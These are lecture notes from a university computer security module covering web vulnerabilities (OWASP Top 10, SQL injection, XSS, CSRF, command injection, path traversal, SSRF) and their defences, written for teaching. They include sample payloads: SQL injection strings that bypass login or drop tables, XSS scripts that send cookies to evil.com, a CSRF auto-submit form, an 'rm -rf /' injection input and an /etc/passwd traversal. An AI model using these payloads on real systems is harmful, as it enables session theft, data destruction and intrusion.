---
title: "Web Security"
order: 7
moduleTitle: "COMP3028 - Computer Security"
tags: ["XSS", "CSRF", "SQL-injection", "OWASP", "web-security"]
---

## OWASP Top 10 (2021)

| # | Category | Key risk |
|---|----------|----------|
| 1 | Broken Access Control | Unauthorised access to resources |
| 2 | Cryptographic Failures | Sensitive data exposed (weak crypto) |
| 3 | Injection | SQL, OS command, LDAP injection |
| 4 | Insecure Design | Flawed architecture/design |
| 5 | Security Misconfiguration | Default creds, unnecessary features |
| 6 | Vulnerable Components | Outdated libraries with known CVEs |
| 7 | Auth Failures | Broken authentication/session management |
| 8 | Software/Data Integrity | Untrusted updates, CI/CD compromise |
| 9 | Logging Failures | Insufficient monitoring/alerting |
| 10 | SSRF | Server-Side Request Forgery |

## SQL Injection

### How It Works

Unsanitised user input is concatenated into SQL queries.

```sql
-- Vulnerable code
query = "SELECT * FROM users WHERE name='" + input + "'"

-- Attacker input: ' OR '1'='1
-- Resulting query:
SELECT * FROM users WHERE name='' OR '1'='1'
-- Returns ALL users
```

### Types

| Type | Behaviour |
|------|-----------|
| Classic (in-band) | Results shown in response |
| Blind (boolean) | True/false response differences |
| Blind (time-based) | Response time differences (`SLEEP(5)`) |
| Out-of-band | Data exfiltrated via DNS/HTTP to attacker |
| Second-order | Payload stored, executes later |

### Attack Examples

```sql
-- Authentication bypass
' OR 1=1 --

-- Extract data (UNION-based)
' UNION SELECT username, password FROM users --

-- Drop table
'; DROP TABLE users; --

-- Time-based blind
' OR IF(1=1, SLEEP(5), 0) --
```

### Mitigation

| Defence | How | Effectiveness |
|---------|-----|:---:|
| **Prepared statements** (parameterised queries) | Separate SQL logic from data | Best |
| Stored procedures | Pre-compiled queries | Good |
| Input validation (whitelist) | Only allow expected characters | Defence in depth |
| Escaping | Escape special characters | Fragile (not recommended alone) |
| Least privilege | DB user has minimal permissions | Limits damage |
| WAF | Web Application Firewall rules | Defence in depth |

```python
# SAFE: Parameterised query
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))

# UNSAFE: String concatenation
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")
```

## Cross-Site Scripting (XSS)

### How It Works

Attacker injects malicious JavaScript that executes in victim's browser.

### Types

| Type | Storage | Trigger |
|------|---------|---------|
| **Reflected** | Not stored; in URL/request | Victim clicks crafted link |
| **Stored** (Persistent) | Saved in database | Anyone viewing the page |
| **DOM-based** | Client-side only | Manipulates DOM without server |

### Attack Examples

```html
<!-- Reflected XSS in search -->
https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

<!-- Stored XSS in comment -->
<script>fetch('https://evil.com/log?cookie='+document.cookie)</script>

<!-- DOM-based XSS -->
<script>
  var input = location.hash.substring(1);
  document.getElementById('output').innerHTML = input;  // Dangerous!
</script>
```

### Impact

| Impact | Example |
|--------|---------|
| Session hijacking | Steal cookies |
| Credential theft | Inject fake login form |
| Keylogging | Capture user keystrokes |
| Defacement | Modify page content |
| Malware distribution | Redirect to malicious site |

### Mitigation

| Defence | How |
|---------|-----|
| **Output encoding** | Encode `<`, `>`, `&`, `"`, `'` as HTML entities |
| **Content Security Policy (CSP)** | Restrict script sources: `script-src 'self'` |
| **HttpOnly cookies** | JavaScript cannot access cookies |
| Input validation | Reject/sanitise suspicious input |
| DOM manipulation safety | Use `textContent` not `innerHTML` |
| Frameworks | Modern frameworks auto-escape (React, Angular) |

## Cross-Site Request Forgery (CSRF)

### How It Works

Victim's browser sends authenticated request to target site (exploiting existing session cookie).

```html
<!-- On attacker's page -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- Or form auto-submit -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### Conditions Required

1. Victim is authenticated (has session cookie)
2. Target site relies only on cookies for authentication
3. Attacker can predict all request parameters

### Mitigation

| Defence | How |
|---------|-----|
| **Anti-CSRF token** | Unique per-session/per-request token in forms |
| **SameSite cookies** | `SameSite=Strict` or `Lax` |
| **Check Origin/Referer** | Verify request origin matches site |
| Re-authentication | Require password for sensitive actions |
| Custom headers | AJAX with custom header (CORS blocks cross-origin) |

### CSRF vs XSS

| | CSRF | XSS |
|-|------|-----|
| Exploits | User's authenticated session | Trust in the website |
| Attacker can | Perform actions as victim | Read/modify page, steal data |
| Requires | Victim visits attacker page | Injection point on target site |
| Limitation | Cannot read responses | Full browser access (within origin) |

## Other Web Vulnerabilities

### Command Injection

```python
# Vulnerable
os.system("ping " + user_input)
# Input: ; rm -rf /
# Executes: ping ; rm -rf /
```

Defence: Never pass user input to shell commands. Use parameterised APIs.

### Path Traversal

```
https://site.com/file?name=../../../etc/passwd
```

Defence: Validate/canonicalise paths, chroot, whitelist allowed files.

### Server-Side Request Forgery (SSRF)

```
https://site.com/fetch?url=http://169.254.169.254/metadata
```

Attacker makes server request internal resources. Defence: URL allowlist, block internal IPs.

### Insecure Deserialisation

Untrusted data deserialised into objects that execute code. Defence: Don't deserialise untrusted data, use data-only formats (JSON).

## Security Headers

| Header | Purpose | Example |
|--------|---------|---------|
| `Content-Security-Policy` | Restrict resource loading | `default-src 'self'` |
| `X-Content-Type-Options` | Prevent MIME sniffing | `nosniff` |
| `X-Frame-Options` | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
| `Strict-Transport-Security` | Force HTTPS | `max-age=31536000; includeSubDomains` |
| `X-XSS-Protection` | Browser XSS filter | `1; mode=block` (deprecated) |
| `Referrer-Policy` | Control Referer header | `strict-origin-when-cross-origin` |

<details>
<summary><strong>Practice: Identify the vulnerability type</strong></summary>

1. User comment displayed without encoding --> **Stored XSS**
2. Transfer funds via GET request without token --> **CSRF**
3. `"SELECT * FROM items WHERE id=" + request.id` --> **SQL Injection**
4. `os.system("convert " + filename)` --> **Command Injection**
5. `open("/uploads/" + user_path)` --> **Path Traversal**
6. Image URL fetched by server from user input --> **SSRF**
</details>

<details>
<summary><strong>Practice: Why doesn't CSRF work with custom headers?</strong></summary>

1. Browsers enforce the Same-Origin Policy for AJAX requests
2. Cross-origin requests with custom headers trigger a CORS preflight (OPTIONS request)
3. The target server would not include the attacker's origin in `Access-Control-Allow-Origin`
4. The browser blocks the request
5. Simple requests (GET/POST with standard headers) do not trigger preflight -- hence CSRF tokens are still needed for forms
</details>
